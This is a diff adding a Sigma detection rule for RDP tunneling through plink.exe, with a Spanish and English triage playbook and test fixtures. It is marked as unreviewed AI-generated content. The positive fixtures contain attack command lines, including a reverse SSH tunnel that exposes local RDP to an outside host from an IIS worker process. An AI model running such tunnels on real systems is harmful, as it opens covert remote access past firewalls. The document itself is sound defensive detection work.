@@ -1,0 +1,132 @@
+{
+  "rule": {
+    "id": "f38ce0b9-5e97-4b47-a211-7dc8d8b871da",
+    "title": "Potential RDP Tunneling Via Plink",
+    "level": "high",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_plink_susp_tunneling.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_plink_susp_tunneling.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1572"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó plink.exe con una línea de comandos que reenvía el puerto RDP 3389, lo que indica un posible túnel SSH para exponer o alcanzar el escritorio remoto a través de un host externo.",
+      "what_it_detects": "Creación de procesos de plink.exe (cliente SSH de línea de comandos de PuTTY) cuya CommandLine contiene ':127.0.0.1:3389', o bien ':3389' junto con ' -P 443' o ' -P 22', patrón típico de reenvío de puertos (-R/-L) hacia RDP.",
+      "why_it_matters": "Un túnel SSH inverso permite a un atacante entrar por RDP a un equipo interno saltándose firewalls y NAT, ocultando el tráfico dentro de SSH (ATT&CK T1572, Protocol Tunneling). Suele indicar acceso interactivo y movimiento lateral.",
+      "triage_steps": [
+        "Revisar CommandLine: identificar -R (inverso) o -L (local), el host SSH remoto, el usuario, el puerto -P y si incluye contraseña con -pw.",
+        "Verificar la ruta en Image: plink.exe en Users\\Public, Temp, ProgramData o carpetas web es muy sospechoso frente a Program Files\\PuTTY.",
+        "Analizar ParentImage y la cadena de procesos: w3wp.exe, cmd.exe lanzado por un servicio o PowerShell remoto sugieren compromiso.",
+        "Comprobar el destino SSH: reputación de la IP o dominio, si es infraestructura propia y si existen conexiones salientes a 22 o 443 desde el host.",
+        "Buscar en el mismo host +/- 15 minutos: descarga de plink, cambios en RDP (fDenyTSConnections), creación de cuentas y reglas de firewall.",
+        "Revisar inicios de sesión RDP (Event ID 4624 tipo 10, 1149) con origen 127.0.0.1 o ::1, señal de uso del túnel.",
+        "Pivotar por el usuario y el hash de plink.exe en otros endpoints y revisar alertas previas de la misma entidad."
+      ],
+      "false_positives": [
+        "Administradores que usan plink para acceder por RDP a servidores mediante un bastión SSH autorizado.",
+        "Scripts de soporte remoto o proveedores que crean túneles documentados hacia RDP; validar con el ticket de cambio."
+      ],
+      "response_steps": [
+        "Confirmar con el dueño del equipo y el usuario si el túnel está autorizado antes de actuar.",
+        "Si no está autorizado, aislar el endpoint, terminar plink.exe y bloquear la IP o dominio SSH remoto en el perímetro.",
+        "Restablecer credenciales usadas en -pw y de cuentas con sesiones RDP recientes; revisar llaves SSH almacenadas.",
+        "Eliminar el binario y cualquier persistencia (tareas programadas, servicios, webshells o módulos IIS) tras preservar evidencia.",
+        "Buscar el mismo patrón en toda la flota y restringir RDP y SSH saliente según la política."
+      ],
+      "severity_rationale": "Alta, porque reenviar RDP por SSH en un endpoint es poco común en uso legítimo y suele implicar acceso remoto interactivo de un atacante."
+    },
+    "en": {
+      "summary": "plink.exe ran with a command line forwarding RDP port 3389, suggesting an SSH tunnel used to expose or reach Remote Desktop through an external host.",
+      "what_it_detects": "Process creation of plink.exe (PuTTY's command-line SSH client) whose CommandLine contains ':127.0.0.1:3389', or ':3389' together with ' -P 443' or ' -P 22', a typical -R/-L port-forward to RDP.",
+      "why_it_matters": "A reverse SSH tunnel lets an attacker RDP into an internal host past firewalls and NAT, hiding traffic inside SSH (ATT&CK T1572, Protocol Tunneling). It usually means hands-on-keyboard access and lateral movement.",
+      "triage_steps": [
+        "Read CommandLine: note -R (reverse) or -L (local), the remote SSH host, username, -P port, and any -pw password.",
+        "Check the Image path: plink.exe under Users\\Public, Temp, ProgramData or web folders is far more suspicious than Program Files\\PuTTY.",
+        "Review ParentImage and the process tree: w3wp.exe, service-spawned cmd.exe or remote PowerShell suggest compromise.",
+        "Assess the SSH destination: reputation, whether it is company infrastructure, and outbound connections to 22 or 443 from the host.",
+        "On the same host within +/- 15 minutes, look for plink download, RDP enablement (fDenyTSConnections), new accounts and firewall rule changes.",
+        "Review RDP logons (Event ID 4624 type 10, 1149) sourced from 127.0.0.1 or ::1, indicating tunnel use.",
+        "Pivot on the user and plink.exe hash across other endpoints and check earlier alerts for the same entities."
+      ],
+      "false_positives": [
+        "Administrators using plink to RDP into servers through an authorized SSH bastion.",
+        "Documented vendor or remote-support scripts tunneling RDP; validate against the change ticket."
+      ],
+      "response_steps": [
+        "Confirm with the host owner and user whether the tunnel is authorized before acting.",
+        "If unauthorized, isolate the endpoint, kill plink.exe and block the remote SSH host at the perimeter.",
+        "Reset credentials passed via -pw and for accounts with recent RDP sessions; review stored SSH keys.",
+        "After preserving evidence, remove the binary and persistence (scheduled tasks, services, webshells or IIS modules).",
+        "Hunt for the same pattern fleet-wide and restrict RDP and outbound SSH per policy."
+      ],
+      "severity_rationale": "High, because forwarding RDP over SSH from an endpoint is rare in legitimate use and usually signals interactive attacker access."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Reverse tunnel exposing local RDP via plink from a public folder, spawned by IIS worker (selection_a).",
+        "event": {
+          "EventID": 1,
+          "Computer": "WEB-IIS-03.andes.example.com",
+          "User": "IIS APPPOOL\\DefaultAppPool",
+          "Image": "C:\\Users\\Public\\plink.exe",
+          "OriginalFileName": "Plink",
+          "CommandLine": "C:\\Users\\Public\\plink.exe -batch -R 4489:127.0.0.1:3389 svc@203.0.113.25 -P 443",
+          "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+          "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"DefaultAppPool\""
+        }
+      },
+      {
+        "description": "Local forward to an internal host's RDP over SSH port 22 (selection_b1 and selection_b2).",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\ProgramData\\tmp\\plink.exe",
+          "OriginalFileName": "Plink",
+          "CommandLine": "plink.exe -L 13389:10.10.5.20:3389 tunnel@198.51.100.40 -P 22 -N",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c run.bat"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate plink use by Git over SSH on port 22 with no RDP forwarding.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0211.andes.example.com",
+          "User": "ANDES\\mlopez",
+          "Image": "C:\\Program Files\\PuTTY\\plink.exe",
+          "OriginalFileName": "Plink",
+          "CommandLine": "\"C:\\Program Files\\PuTTY\\plink.exe\" -batch -P 22 git@git.example.com \"git-upload-pack 'team/app.git'\"",
+          "ParentImage": "C:\\Program Files\\Git\\mingw64\\bin\\git.exe"
+        }
+      },
+      {
+        "description": "Built-in RDP client connecting to port 3389; image is not plink.exe and no -P 22/443.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\mstsc.exe",
+          "OriginalFileName": "mstsc.exe",
+          "CommandLine": "mstsc.exe /v:srv-app-01.andes.example.com:3389",
+          "ParentImage": "C:\\Windows\\explorer.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
